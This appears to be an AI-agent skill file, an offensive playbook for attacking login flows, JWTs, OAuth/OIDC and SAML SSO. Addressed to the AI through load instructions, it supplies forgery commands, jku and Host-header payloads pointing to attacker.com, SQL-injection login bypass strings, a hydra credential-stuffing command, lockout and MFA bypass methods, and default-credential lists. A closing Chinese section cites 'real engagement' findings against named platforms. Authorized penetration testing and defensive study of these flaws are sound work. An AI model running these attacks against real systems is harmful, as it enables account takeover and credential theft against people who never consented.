---
name: auth-token
description: >-
  Authentication and token attack chain. Covers JWT attacks (alg confusion/kid traversal/JWKS injection), OAuth/OIDC misconfiguration (redirect URI/PKCE downgrade/state bypass), SAML assertion attacks (signature wrapping/assertion replay), and authentication bypass (bcrypt truncation/password reset poisoning/MFA bypass/2-minute Lax exemption). Load when testing login flows, tokens, or SSO.
---

<!-- src: hacker/.claude/skills/auth-token/SKILL.md -->

# Authentication & Token Attacks — Complete Chain

## Internal Navigation
| Part | Content |
|---|---|
| 1 | JWT & OAuth Token Attacks |
| 2 | OAuth/OIDC Misconfiguration |
| 3 | SAML SSO Assertion Attacks |
| 4 | Authentication Bypass & Flaws |

---
# Part 1: JWT & OAuth Token Attacks


# SKILL: JWT and OAuth 2.0 Token Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication token attacks. Covers JWT cryptographic attacks (alg:none, RS256→HS256, secret crack, kid/jku injection), OAuth flow attacks (CSRF, open redirect, token theft, implicit flow abuse), PKCE bypass, and token leakage via Referer/logs. This is critical for modern web applications.

## 0. RELATED ROUTING

Use this file for token-centric attacks and flow abuse. Also load:

- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) for redirect URI, state, nonce, PKCE, and account-binding validation
- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when browser-readable APIs or token leakage may exist cross-origin
- [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md) when the target uses enterprise SSO outside OAuth/OIDC


## 1. JWT ANATOMY

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**Decode in terminal**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
# → {"userId":1234,"role":"user"}
```

**Common claim targets** (modify to escalate):
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

```bash
# Burp JWT Editor / python-jwt attack:
# Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

# Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
# OR:
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
# → automatically generates alg:none variants
```

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
# Step 1: Obtain public key (PEM format)
# From: /api/.well-known/jwks.json → convert to PEM
# From: /certs endpoint
# From: OpenSSL extraction from HTTPS cert

# Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# Step 3: Manually:
# Modify header: {"alg":"HS256","typ":"JWT"}
# Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---

## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

HMAC-based JWTs (HS256/HS384/HS512) with weak secret:

```bash
# hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

# john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. ATTACK 4 — kid (Key ID) INJECTION

The `kid` header parameter specifies which key to use for verification. No sanitization = injection:

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`  
Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.

### kid Path Traversal (file read)
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
Server reads `/dev/null` as key → empty string → sign token with empty HMAC.

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
Server reads hostname as key → forge tokens signed with hostname string.

---

## 6. ATTACK 5 — jku / x5u Header Injection

`jku` points to JSON Web Key Set URL. If not whitelisted:
```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

**Setup**:
```bash
# Generate RSA key pair:
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Create JWKS:
python3 -c "
import json, base64, struct
# ... (use python-jwcrypto or jwt_tool to export JWKS)
"

# Host malicious JWKS at attacker.com/malicious-jwks.json
# Sign JWT with attacker's private key
# Server fetches attacker's JWKS → verifies with attacker's public key → accepts
```

**jwt_tool automation**:
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```

---

## 7. OAUTH 2.0 — STATE PARAMETER MISSING (CSRF)

State parameter prevents CSRF in OAuth. If missing:

```
Attack:
1. Click "Login with Google" → OAuth starts → intercept the redirect URL:
   https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...

2. Get the authorization code (stop before exchanging it)
3. Craft URL: https://target.com/oauth/callback?code=ATTACKER_CODE
4. Victim clicks that URL → their session binds to ATTACKER's OAuth identity
→ ACCOUNT TAKEOVER
```

---

## 8. OAUTH — REDIRECT_URI BYPASS

Authorization codes are sent to `redirect_uri`. If validation is weak:

### Open Redirect in redirect_uri
```
Original: redirect_uri=https://target.com/callback
Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
          redirect_uri=https://attacker.com.target.com/callback
          redirect_uri=https://target.com@attacker.com/callback
```

### Partial Path Match
```
Whitelist: https://target.com/callback
Attack: https://target.com/callback%2f../admin (URL path confusion)
        https://target.com/callbackXSS (prefix match only)
```

### Localhost / Development Redirect
```
redirect_uri=http://localhost/steal
redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
```

---

## 9. OAUTH — IMPLICIT FLOW TOKEN THEFT

Implicit flow: token sent in URL fragment `#access_token=...`

**Fragment leakage scenarios**:
- Redirect to attacker page: fragment accessible via `document.referrer` or via `<script>window.location.href</script>` in target page
- Open redirect: `redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → token in fragment lands at attacker's page

---

## 10. OAUTH — SCOPE ESCALATION

Request broader scope than authorized in authorization code:
```
Authorized scope: read:profile
Attack: During token exchange, add scope=admin or scope=read:admin
→ Does server grant requested scope or issued scope?
```

---

## 11. TOKEN LEAKAGE VECTORS

### Referer Header
Token in URL → page loads external resource → Referer leaks token:
```
https://target.com/dashboard#access_token=TOKEN
→ HTML loads: <img src="https://analytics.third-party.com/track">
→ Referer: https://target.com/dashboard#access_token=TOKEN
→ analytics.third-party.com sees token in Referer logs
```

### Server Logs
Access tokens sent in query parameters are stored in:
```
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB logs (AWS)
CloudFront logs
CDN logs
```

---

## 12. JWT TESTING CHECKLIST

```
□ Decode header + payload (base64 decode each part)
□ Identify algorithm: HS256/RS256/ES256/none
□ Modify payload fields (role, userId, isAdmin) → change signature too
□ Test alg:none → remove signature entirely
□ If RS256: find public key → attempt RS256→HS256 confusion
□ If HS256: brute force with hashcat/rockyou
□ Check kid parameter → try SQL injection + path traversal
□ Check jku/x5u header → redirect to attacker JWKS
□ Test token reuse after logout
□ Test expired token acceptance (exp claim)
□ Check for token in GET params (log leakage) vs header
```

---

## 13. OAUTH TESTING CHECKLIST

```
□ Check for state parameter in authorization request
□ Test redirect_uri manipulation (open redirect, prefix match, path confusion)
□ Can tokens be exchanged more than once?
□ Test scope escalation during token exchange
□ Implicit flow: check for token in Referer/history
□ PKCE: can code_challenge be bypassed or code_verifier be empty?
□ Check for authorization code reuse (code must be single-use)
□ Test account linking abuse: link OAuth to existing account with same email
□ Check OAuth provider confusion: use Apple ID to link where Google expected
```


---
# Part 2: OAuth/OIDC Misconfiguration


# SKILL: OAuth and OIDC Misconfiguration — Redirects, PKCE, Scopes, and Token Binding

> **AI LOAD INSTRUCTION**: Use this skill when the target uses OAuth 2.0 or OpenID Connect and you need a focused misconfiguration checklist: redirect URI validation, state and nonce handling, PKCE enforcement, token audience, and account binding mistakes.

## 1. WHEN TO LOAD THIS SKILL

Load when:

- The app supports `Login with Google`, GitHub, Microsoft, Okta, or other IdPs
- You see `authorize`, `callback`, `redirect_uri`, `code`, `state`, `nonce`, or `code_challenge`
- Mobile or SPA clients rely on OAuth or OIDC flows

For token cryptography and JWT header abuse, also load:

- [jwt oauth token attacks](../jwt-oauth-token-attacks/SKILL.md)

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| `state` handling | missing, static, predictable, or not bound to user session |
| `redirect_uri` validation | prefix match, open redirect chaining, path confusion, localhost leftovers |
| PKCE | missing for public clients, code verifier not enforced, downgraded flow |
| OIDC `nonce` | missing or not validated on ID token return |
| token audience and issuer | weak `aud` / `iss` checks, cross-client token reuse |
| account binding | callback binds attacker identity to victim session |
| scope handling | broader scopes granted than the user or client should receive |

## 3. QUICK TRIAGE

1. Map the full flow: authorize, callback, token exchange, logout.
2. Replay callback flows with altered `state`, `nonce`, and `redirect_uri`.
3. Compare SPA, mobile, and web clients for weaker validation.
4. Check whether one provider account can be rebound to another local account.

## 4. RELATED ROUTES

- CORS or cross-origin token exposure: [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md)
- XML federation or enterprise SSO: [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md)
- CSRF-heavy login or binding bugs: [csrf cross site request forgery](../csrf-cross-site-request-forgery/SKILL.md)

---
# Part 3: SAML SSO Assertion Attacks


# SKILL: SAML SSO and Assertion Attacks — Signature Validation, Binding, and Trust Confusion

> **AI LOAD INSTRUCTION**: Use this skill when the target uses SAML-based SSO and you need to validate assertion trust: signature coverage, audience and recipient checks, ACS handling, XML parsing weaknesses, and IdP/SP confusion.

## 1. WHEN TO LOAD THIS SKILL

Load when:

- Enterprise SSO uses SAML requests or responses
- You see `SAMLRequest`, `SAMLResponse`, XML assertions, or ACS endpoints
- Login flows involve an external IdP and browser POST/redirect binding

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| signature validation | unsigned assertion accepted, wrong node signed, signature wrapping |
| audience and recipient | weak `Audience`, `Recipient`, `Destination`, or ACS validation |
| issuer trust | wrong IdP accepted or multi-tenant issuer confusion |
| replay and freshness | missing `InResponseTo`, weak `NotBefore` / `NotOnOrAfter` enforcement |
| account mapping | email-only binding, case folding, unverified attributes |
| XML parser behavior | XXE-like parser issues or unsafe transforms around SAML documents |

## 3. QUICK TRIAGE

1. Capture one full login round trip.
2. Inspect which XML nodes are signed and which attributes drive account binding.
3. Compare SP-initiated and IdP-initiated flows.
4. Test replay, altered attributes, and assertion placement confusion.

## 4. RELATED ROUTES

- XML parser attack depth: [xxe xml external entity](../xxe-xml-external-entity/SKILL.md)
- OAuth or OIDC SSO alternatives: [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md)
- Auth boundary issues after SSO: [authbypass authentication flaws](../authbypass-authentication-flaws/SKILL.md)

---
# Part 4: Authentication Bypass & Flaws


# SKILL: Authentication Bypass — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication bypass techniques. Covers SQL injection-based login bypass, password reset flaws, token predictability, account enumeration, brute force bypass, and multi-factor auth bypass. Distinct from JWT/OAuth (covered in ../jwt-oauth-token-attacks/SKILL.md). Focus on the login mechanism itself.

## 0. AUTHORIZED CREDENTIAL TEST PLANNING

After reducing routing entries, default credentials, username variants, port focus, and wordlist sizing are handled here in one place.

### Service-first tiny sets

| Service Type | First Usernames | First Passwords |
|---|---|---|
| phpMyAdmin | `root`, `admin` | empty, `root`, `phpmyadmin`, `admin` |
| FTP | `ftp`, `admin`, `test` | empty, `ftp`, `admin`, `123456` |
| SSH | `root`, `admin`, service account names | `root`, `admin`, seasonal variants |
| MySQL | `root`, `mysql` | empty, `root`, `mysql` |
| Tomcat / Java admin | `tomcat`, `admin`, `manager` | `tomcat`, `admin`, `s3cret` |
| WebLogic | `weblogic`, `admin` | `weblogic`, `welcome1`, `admin` |

### Username classes

| Class | Examples |
|---|---|
| Generic admins | `admin`, `administrator`, `root`, `test`, `guest` |
| Support / ops | `dev`, `ops`, `sysadmin`, `service`, `backup` |
| Name-based | `firstname`, `lastname`, `f.lastname`, `first.last` |
| Mail-derived | left side of corporate email formats |
| Product-based | `tomcat`, `weblogic`, `jenkins`, `gitlab` |

### Wordlist sizing and port focus

| Scenario | Preferred Size | Why |
|---|---|---|
| Default admin panel | 5 to 50 passwords | Defaults beat giant lists here |
| Internal service with known product | vendor-specific small set | Better signal than generic lists |
| Consumer login with weak controls | Top 20 or Top 100 | Fast verification |
| Rate-limited login | tiny list + header/rotation strategy | Preserve attempts |
| Offline hash cracking | large dictionaries | Online brute rules do not apply |

Prioritize common ports and service surfaces: 80/443/8080/8443 admin panels, 22 SSH, 21 FTP, and 3306/5432/6379/27017 data or management services.


## 1. SQL INJECTION LOGIN BYPASS

Classic but still found in legacy systems, custom ORMs, and raw query code:

```sql
-- Basic bypass (admin user assumed first row):
Username: admin'--
Password: anything
→ Query: SELECT * FROM users WHERE user='admin'--' AND pass='anything'

-- Generic bypass (logs in as first user in DB):
Username: ' OR '1'='1'--
Password: anything
→ Query: SELECT * FROM users WHERE user='' OR '1'='1'--' AND pass='anything'

-- Blind: does this work?
Username: ' OR 1=1--
Username: admin' OR 'a'='a
Username: 1' OR '1'='1'/*
Username: 1 or 1=1
```

**Test each field separately** — only one field may be vulnerable.

---

## 2. PASSWORD RESET VULNERABILITIES

### Guessable / Predictable Reset Tokens

Check if reset token is based on:
```
- Timestamp: token=1691234567890 (Unix time)
- Sequential: token=1001, 1002, 1003
- MD5(email): echo -n "user@example.com" | md5sum
- MD5(username+timestamp): reversible
- Short token (4-6 digits): brute-forceable
```

**Test**: Request 3 consecutive reset emails, compare token patterns.

### Reset Token Not Expiring
```
1. Request password reset → get token via email
2. Wait 48+ hours (token should expire)
3. Use old token → does it work?
```

### Reset Token Reuse
```
1. Request reset → get token T1
2. Complete reset with T1
3. Use T1 again → does it work again?
```

### Host Header Injection in Reset Email
When application generates reset URL using `Host` header:
```http
POST /forgot-password HTTP/1.1
Host: attacker.com           ← inject attacker's domain
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
→ Reset email sent to victim with link pointing to `attacker.com/reset?token=VICTIM_TOKEN`
→ Victim clicks → token captured by attacker

**Test**: Send password reset with modified `Host:`, check email for where reset link points.

### Password Reset Token in Referer
```
1. Request reset → go to reset URL with token
2. Reset page loads third-party resources (analytics, fonts)
→ Referer header leaks: https://target.com/reset?token=TOKEN
→ Third-party server receives token in logs
```

### Password Change Without Current Password
```
PUT /api/user/password
{"new_password": "hacked"}
→ No current_password field required?
→ Combine with CSRF for account takeover
```

---

## 3. ACCOUNT ENUMERATION

Identifying valid usernames/emails enables targeted attacks:

### Error Message Difference
```
Invalid username → "User not found"
Valid username, wrong pass → "Incorrect password"
→ Enumerate valid accounts
```

### Response Time Difference
```
Invalid username → fast response (no DB lookup)
Valid username → slightly slower (DB lookup + hash comparison)
→ Timing oracle
```

### Password Reset Flow
```
POST /forgot-password {"email": "nonexistent@example.com"}
→ "If this email exists, we sent a reset link" (proper)
vs.
→ "This email is not registered" (enumeration possible)
```

### Registration Endpoint
```
POST /register {"email": "victim@example.com"}
→ "Email already registered" → confirms account exists
vs.
→ "Verification email sent" for both → no enumeration
```

---

## 4. BRUTE FORCE BYPASS

### Lockout After N Attempts Then Resets
```
Lockout at 10 attempts → try 9 wrong passwords → lock
Wait for reset period (usually 30 min or 1 hour)
→ Try 9 more → repeat → no permanent lockout
```

### IP-Based Lockout Bypass
```
X-Forwarded-For: 1.1.1.1       ← change each request
X-Real-IP: 2.2.2.2
Rotate through IPs in header
```

### Username Cycling vs Password Cycling
```
Normal brute: try many passwords for one user → lock
Reverse brute: try ONE password for many users
→ "password123" against all users → find those with weak password
→ No single account locked out
```

### Credential Stuffing
Use breached credentials from HaveIBeenPwned datasets against target:
```bash
# Tools: Hydra, Burp Intruder, custom scripts
hydra -C credentials.txt https-post-form://target.com/login:"username=^USER^&password=^PASS^":"error message"
```

---

## 5. MULTI-FACTOR AUTHENTICATION BYPASS

### Session Cookie Before 2FA Completion
```
Flow: Login (password correct) → redirect to 2FA page → enter code
Attack: After password step, session cookie is set but 2FA not yet checked.
→ Use session cookie to directly access /dashboard
→ Skip 2FA page entirely
```

### 2FA Code Brute Force
```
4-6 digit TOTP codes = 1,000,000 possibilities max
If no lockout on 2FA step:
→ Brute force all codes (tool: Burp Intruder, sequential)
→ TOTP windows: 30-second window, some accept previous/next window
```

### 2FA on Critical Actions Not On Login
```
Login doesn't require 2FA, but:
DELETE /account or POST /transfer requires 2FA
Attack: Is 2FA checked on those actions or only on login?
→ If only login: log in once → no 2FA needing verification for actions
```

### 2FA Backup Code Abuse
```
Generate backup codes (usually 8-10 single-use)
Test: 
→ Are backup codes rate-limited?
→ Can backup codes be used multiple times?
→ Short codes (6-8 chars)? Brute-force if no rate limit
```

### 2FA Code Reuse
```
TOTP codes valid for one use
→ Use same TOTP code twice → does second use work?
→ Replay attack if server doesn't track used codes
```

---

## 6. OAUTH / SSO ACCOUNT TAKEOVER PATTERNS

### Email Claim Trust
```
1. Create account at attacker-controlled OAuth provider
2. Set email claim = victim@target.com
3. Link/login via that provider
→ If server trusts email claim without verification → account merge/takeover
```

### Password Doesn't Apply After SSO Link
```
1. User links Google SSO
2. User forgets password (account has no password set after SSO only)
3. "Forgot Password" flow → resets password even for SSO-only accounts?  
→ Can set password → now bypass SSO → direct login
```

---

## 7. USERNAME / PASSWORD FIELD MANIPULATION

### Long Password DoS → Bypass
```
Some apps hash passwords before sending to database.
bcrypt has 72-byte limit — input beyond 72 bytes is ignored.
Attack: 
→ Register with password "A"*100
→ Login with password "A"*72 → same hash → works
→ Login with "A"*71 + "totally different" → if truncation → same hash if first 72 chars match
```

### Null Byte in Username
```
username=admin%00 vs username=admin
→ Null byte truncation in some string comparisons
→ "admin\0attacker" = "admin" in C-string comparison
```

### Unicode Normalization
```
Username: "ⓢcott" → normalizes to "scott" → impersonates "scott"
Username: "admin" (various Unicode homoglyphs for letters a,d,m,i,n)
```

---

## 8. SESSION MANAGEMENT FLAWS

### Session Not Invalidated on Logout
```
1. Log in → capture session cookie
2. Log out
3. Replay captured session cookie → still valid?
→ Session not server-side invalidated
```

### Session Not Regenerated on Privilege Change
```
1. Log in as low priv → get session cookie
2. Admin upgrades your role
3. Old session cookie now has admin access?
→ Session not regenerated → old token inherits new privileges
```

### Predictable Session Tokens
```
Token: base64(userid+timestamp) → reversible
Token: sequential integers → session ID= your_session_id -/+ small number
Token: short random (32-bit entropy) → brute-forceable
```

---

## 9. AUTHENTICATION TESTING CHECKLIST

```
□ Try SQL injection on login fields (' OR 1=1--)
□ Test password reset: predict token, host header injection, Referer leak
□ Test account enumeration via error messages / timing
□ Check 2FA: skip step (direct URL), brute force codes, reuse codes
□ Test brute force protections: X-Forwarded-For bypass, reverse brute
□ Check session invalidation on logout
□ Check session regeneration after privilege change
□ Test password change requiring current password  
□ Test long passwords (bcrypt 72-byte truncation)
□ OAuth/SSO: test email claim trust, password set after SSO
□ Check remember_me tokens: how long, revocable, predictable?
```

---

## 10. PASSWORD RESET ATTACK MATRIX (22 Patterns)

| # | Pattern | Description |
|---|---|---|
| 1 | Predictable reset token | Token based on timestamp, user ID, or sequential number |
| 2 | Token not bound to user | Use token generated for user A to reset user B |
| 3 | Token in response body | Reset token returned in HTTP response (not just email) |
| 4 | Token in URL parameter | Reset link token visible in Referer header to external resources |
| 5 | No token expiration | Token remains valid indefinitely |
| 6 | Token reuse | Same token works multiple times |
| 7 | Short/brute-forceable token | 4-6 digit numeric code without rate limiting |
| 8 | Password reset via host header | `Host: attacker.com` → reset link sent with attacker's domain |
| 9 | Registration overwrites existing account | Register with same email → overwrites password |
| 10 | Step skip (frontend only) | Jump directly to "set new password" step via URL |
| 11 | Response manipulation | Change `{"status":"fail"}` to `{"status":"success"}` in proxy |
| 12 | Verification code in response | SMS/email code returned in API response |
| 13 | Parallel session reset | Start reset for A, complete with B's session |
| 14 | Email/phone parameter pollution | `email=victim@x.com&email=attacker@x.com` |
| 15 | Unicode normalization | `admin@target.com` vs `ADMIN@target.com` vs Unicode confusables |
| 16 | SQL injection in reset | Email field injectable in reset query |
| 17 | IDOR on reset endpoint | Change user ID in reset confirmation request |
| 18 | Cross-protocol reset | Mobile API doesn't validate same token as web |
| 19 | Default security questions | Guessable answers, no rate limit |
| 20 | Token generation race condition | Multiple simultaneous requests generate same token |
| 21 | Logout doesn't invalidate reset | After password change, old sessions still work |
| 22 | Reset link cached by CDN/proxy | Public cache stores reset link with token |

---

## 11. CAPTCHA/VERIFICATION BYPASS PATTERNS (20 Methods)

| # | Method | How |
|---|---|---|
| 1 | Remove captcha parameter | Delete captcha field from request |
| 2 | Send empty captcha | `captcha=` or `captcha=null` |
| 3 | Reuse previous captcha | Same captcha value works multiple times |
| 4 | Captcha not bound to session | Use captcha solved in session A for session B |
| 5 | Server-side validation missing | Captcha checked client-side only |
| 6 | Response manipulation | Intercept and change response to bypass |
| 7 | Change request method | POST→GET or vice versa may skip captcha check |
| 8 | JSON content-type | Switch from form to JSON — captcha handler may not process |
| 9 | OCR bypass | Simple captchas solvable with tesseract/ML |
| 10 | Audio captcha weakness | Audio often simpler than visual |
| 11 | SMS code in response | Verification code returned in API response body |
| 12 | SMS code predictable | Sequential or time-based codes |
| 13 | No rate limit on code verification | Brute-force 4-6 digit code |
| 14 | Code not bound to phone/email | Use code sent to phone A on account B |
| 15 | Code doesn't expire | Old codes remain valid |
| 16 | Null byte in phone number | `+1234567890%00` bypasses dedup but delivers to same number |
| 17 | Case sensitivity | Email: `Admin@X.com` vs `admin@x.com` |
| 18 | Space/encoding in identifier | `user@x.com` vs `user@x.com ` (trailing space) |
| 19 | Concurrent requests | Race condition: send verify before captcha loads |
| 20 | Third-party captcha bypass | Misconfigured reCAPTCHA site key allows any domain |

---

## 12. INSECURE RANDOMNESS — TOKEN PREDICTION

### UUID v1 (Time-Based — Predictable!)

```
UUID v1 format: timestamp-clock_seq-node(MAC)
# MAC address often leaked via other endpoints
# Timestamp is 100ns intervals since 1582-10-15
# Tool: guidtool (reconstruct possible UUIDs from known timestamp range)
```

### MongoDB ObjectId

```
ObjectId = 4-byte timestamp + 5-byte random + 3-byte counter
# First 4 bytes = Unix timestamp → creation time leaked
# Counter is sequential → adjacent ObjectIds predictable
# If you know one ObjectId, nearby ones are calculable
```

### PHP uniqid()

```php
uniqid() = hex(microtime)
// Output: 5f3e7a4c1d2b3
// Entirely based on current microsecond timestamp
// Predictable if you know approximate server time
```

### PHP mt_rand() Recovery

```
# mt_rand() uses Mersenne Twister PRNG
# After observing ~624 outputs, full internal state is recoverable
# Tool: openwall/php_mt_seed
# Feed known outputs → recover seed → predict all future values
```

### Tools

- `guidtool` — UUID v1 reconstruction
- `AethliosIK/reset-tolkien` — Automated token prediction for password resets
- `openwall/php_mt_seed` — PHP mt_rand seed recovery
- `sandwich` — Token timestamp analysis

---

# 身份诊断三实验（服务端到底认谁？）

目标：搞清"服务端到底认谁"。三条路依次做实验，每条都把完整请求响应落进 evidence/：

1. **cookie 摘除**：逐个摘掉 httpOnly cookie 重放同一请求，看登录态变化
   → 掉登录态的那个就是身份派生源
2. **客户端身份注入对调**：请求里的 userId / X-User-Id / spidertoken 类字段，
   把 A 的值换成 B 的重放 → 服务端认了 = 注入可越权；忽略 = 摆设（也是重要结论）
3. **签名/token 强制性**：摘掉签名头或签名参数重放
   → 还能成功 = 签名非强制（风控软校验的常见形态）

若前置情报带有平台形态参考，优先按它设计实验（参考是假设不是答案，三个实验仍要做全）。

## 三场判例（真实 engagement 结论，示范结论形态）

| 场景 | cookie 摘除 | 注入对调 | 签名强制性 | 结论 |
|---|---|---|---|---|
| 携程 sinfo/ebooking | 摘 cticket → 掉登录态 | spider token 等**服务端忽略** | — | 身份唯一派生源 = httpOnly cticket；客户端身份字段全是摆设 |
| 千问创作平台 | 摘 tongyi_sso_ticket → 掉登录态 | — | 业务 API 签名包（token/signKey）**非强制**，摘掉重放仍成功 | 真鉴权 = httpOnly SSO ticket；签名包只是风控软校验 |
| 通义听悟 | 摘 cookie → NeedLogin | — | 全程无签名 | 纯 cookie 鉴权；判据明确（NeedLogin） |

判例读法：**"客户端字段被忽略"和"签名非强制"本身就是有价值的结论**——它们把
攻击面收窄到真正的身份锚点，别在摆设字段上浪费轮次。
